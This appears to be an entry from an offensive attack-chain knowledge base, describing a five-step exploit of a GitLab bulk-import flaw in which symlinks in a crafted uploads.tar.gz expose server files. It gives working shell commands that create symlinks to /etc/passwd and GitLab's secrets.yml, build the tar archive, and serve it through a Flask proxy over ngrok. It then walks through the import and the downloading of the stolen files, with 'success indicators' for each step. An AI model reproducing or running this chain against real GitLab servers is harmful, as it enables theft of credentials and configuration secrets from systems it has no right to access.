---
id: ba117838-e7bf-4f69-9cfa-9db8adf4755e
type: attack_chain
verified: false
submitted: true
step_count: 5
created_at: '2025-12-11T03:48:05.920Z'
updated_at: '2025-12-11T03:48:05.920Z'
procedures:
  - '[[procedures/Setup-Initial-GitLab-Group-and-Extract-Upload-Secret]]'
  - '[[procedures/Create-Malicious-Tar-File-with-Symlinks]]'
  - '[[procedures/Setup-Proxy-Server-with-Flask-and-Ngrok]]'
  - '[[procedures/Initiate-Malicious-Group-Import]]'
  - '[[procedures/Access-and-Download-Exfiltrated-Files]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
tags:
  - gitlab
  - arbitrary-file-read
  - symlink
  - path-traversal
platforms:
  - Web
  - Linux
tools:
  - '[[tools/Flask]]'
commands: []
complexity: medium
description: >-
  Exploitation of a vulnerability in GitLab's bulk imports UploadsPipeline
  allowing arbitrary file reads through preserved symlinks in extracted tar
  files during group imports
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0009]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1083]]'
---

# Arbitrary File Read in GitLab via Symlink Preservation in Bulk Imports

Multi-stage attack chain demonstrating exploitation of a vulnerability in GitLab's bulk imports UploadsPipeline, where symlinks in the uploads.tar.gz file are preserved during extraction, allowing arbitrary file reads on the server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Setup] --> B[Create Malicious Payload]
    B --> C[Setup Proxy]
    C --> D[Import Group]
    D --> E[Access Files]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#2ecc71
```

## Prerequisites & Requirements

### Required Tools

- #mkdir
- #ln
- #tar
- [[tools/Flask]]
- #ngrok

### Target Environment

- GitLab instance with bulk imports enabled
- Linux-based server
- Access to GitLab web interface

### Initial Access Requirements

- GitLab account with group import permissions
- Ability to create groups on gitlab.com

## Detailed Attack Procedures

## Step 1: Initial Setup - [[procedures/Setup-Initial-GitLab-Group-and-Extract-Upload-Secret]]

**Procedure**: [[procedures/Setup-Initial-GitLab-Group-and-Extract-Upload-Secret]]

**Objective**: Create a source group and extract the upload secret hash needed for crafting the malicious payload.

**Expected Output**: A noted 32-byte upload secret hash from the file upload path.

**Success Indicators**:
- Group created successfully
- Milestone with uploaded file created
- Upload secret extracted from URL

First, use the GitLab web interface to create a new group. Then, create a milestone and upload a dummy file named 'passwd' to generate the upload path. Note the 32-byte hash in the path.

## Step 2: Payload Creation - [[procedures/Create-Malicious-Tar-File-with-Symlinks]]

**Procedure**: [[procedures/Create-Malicious-Tar-File-with-Symlinks]]

**Objective**: Build a tar file containing symlinks to sensitive server files using the extracted upload secret.

**Expected Output**: A malicious uploads.tar.gz file ready for serving via proxy.

**Success Indicators**:
- Directory created with hash name
- Symlinks to /etc/passwd and /srv/gitlab/config/secrets.yml established
- Tar file generated without errors

Execute [[commands/mkdir-create-upload-dir]] to create the directory:

```bash
mkdir ./d3209c811fee407218bff7cb3b4333e6
```

Then, create symlinks with [[commands/ln-symlink-passwd]] and [[commands/ln-symlink-secrets]]:

```bash
ln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd
ln -s /srv/gitlab/config/secrets.yml ./d3209c811fee407218bff7cb3b4333e6/secrets.yml
```

Finally, archive with [[commands/tar-create-uploads-archive]]:

```bash
tar cvzf uploads.tar.gz ./d3209c811fee407218bff7cb3b4333e6
```

## Step 3: Proxy Setup - [[procedures/Setup-Proxy-Server-with-Flask-and-Ngrok]]

**Procedure**: [[procedures/Setup-Proxy-Server-with-Flask-and-Ngrok]]

**Objective**: Set up a local proxy to intercept and serve the malicious tar during the import process.

**Expected Output**: An externally accessible URL from ngrok pointing to the Flask server.

**Success Indicators**:
- Flask server running on port 5000
- Ngrok tunnel established with HTTPS URL

Run the Flask server using [[commands/flask-run-proxy]]:

```bash
FLASK_APP=api flask run
```

Expose it with [[commands/ngrok-expose-server]]:

```bash
ngrok http 5000
```

## Step 4: Import Execution - [[procedures/Initiate-Malicious-Group-Import]]

**Procedure**: [[procedures/Initiate-Malicious-Group-Import]]

**Objective**: Trigger the group import using the proxy URL to inject the malicious tar.

**Expected Output**: Successful import of the group with symlinks preserved.

**Success Indicators**:
- Personal access token generated
- Import initiated with ngrok URL and token
- Import completes without errors

Create a personal access token via GitLab profile. Then, create a new group, select import from the original, provide the ngrok URL and token, and complete the import.

## Step 5: Data Exfiltration - [[procedures/Access-and-Download-Exfiltrated-Files]]

**Procedure**: [[procedures/Access-and-Download-Exfiltrated-Files]]

**Objective**: Access the symlinked files through the imported group's milestone.

**Expected Output**: Downloaded contents of /etc/passwd and secrets.yml.

**Success Indicators**:
- 'passwd' link downloads server /etc/passwd
- Modified URL downloads secrets.yml

View the milestone in the imported group, click the 'passwd' link to download. Modify the URL to access 'secrets.yml'.

## Attack Chain Summary

### Key Achievements

1. Extraction of sensitive server files like /etc/passwd
2. Access to GitLab configuration secrets
3. Compromise of server security via arbitrary file read

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---

*Last updated: 2024-01-01T00:00:00Z*
